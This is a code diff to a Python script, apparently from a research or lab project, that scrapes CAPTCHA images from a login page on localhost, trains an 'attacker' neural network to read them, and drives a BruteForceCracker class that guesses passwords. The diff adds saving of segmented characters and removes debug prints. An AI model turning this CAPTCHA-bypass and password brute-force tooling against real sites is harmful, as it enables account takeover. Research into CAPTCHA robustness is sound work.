@@ -20,13 +20,11 @@ from PIL import Image
 import numpy as np 
 from utils import convert_to_tfds, label_to_chr_emnist
 from feature_extractor import feature_extraction
-import matplotlib.pyplot as plt
 import tensorflow as tf
 import cv2
-from io import BytesIO
 from urllib.request import urlopen
 
-CAPTCHA_TYPE = 1
+CAPTCHA_TYPE = 2
 
 class BruteForceCracker:
     def __init__(self, url, username, error_message_password, trained_model):
@@ -41,6 +39,7 @@ class BruteForceCracker:
             time.sleep(0.02)
 
     def crack(self, password, num_iter=5):
+        j = 0
         for i in range(num_iter) : 
             print("--------- {} captcha try -------------".format(i+1))
             current_captcha = retrieve_captcha_images(self.url, number_iter=1)
@@ -60,7 +59,10 @@ class BruteForceCracker:
                 for index, character in enumerate(characters) : 
                     if character.size == 0 : 
                         return 0
+                
                     resized_image = cv2.resize(character, (28, 28), interpolation=cv2.INTER_AREA)
+                    cv2.imwrite(f'characters/character_{j}.jpg', resized_image)
+                    j += 1
                     pixels = np.array(resized_image).reshape(28, 28, 1)
                     images.append(pixels)
                 tfds_captcha = convert_to_tfds(images)
@@ -103,7 +105,6 @@ def retrieve_captcha_images(url, number_iter=300) :
         else:
             print("Failed to retrieve data. Status code : ", response.status_code)
     stock_image = []
-    # print(img_url)
     for i in range (len(img_url)):
         img_url[i] = "http://localhost:3006" + img_url[i]
         response = requests.get(img_url[i], stream = True)
@@ -131,21 +132,13 @@ def main():
     if CAPTCHA_TYPE == 0 :
         url = "http://localhost:3006/auth/login"
         ###################### MNIST Captcha #########################
-        print("starting attack pipeline")
         captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
-        print("retrieve images ok")
         tfds_captcha_images = convert_to_tfds(captcha_images)
-        print("convert images ok")
         predictions = label_mnist(tfds_captcha_images)
-        print("label images ok")
         attacker_dataset = convert_to_tfds(captcha_images, predictions)
-        print("attacker dataset ok")
         attacker_model = attacker_cnn_mnist.create_model()
-        print("attacker model ok")
         trained_model = attacker_cnn_mnist.train(attacker_model, attacker_dataset, epochs=5)
-        print("training model ok")
         cracker = BruteForceCracker(url, username, error, trained_model)
-        print("cracking ok")
         ###############################################################
     elif CAPTCHA_TYPE == 1 : 
         url = "http://localhost:3006/auth/login?captchaType=EMNIST"
@@ -178,4 +171,4 @@ if __name__ == '__main__':
     #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
     main()
     #retrieve_captcha_images("http://localhost:3006/auth/login?captchaType=Python", number_iter=3)
-    #fetch_captcha("http://localhost:3006/auth/login?captchaType=Python")t images ok
+    #fetch_captcha("http://localhost:3006/auth/login?captchaType=Python")
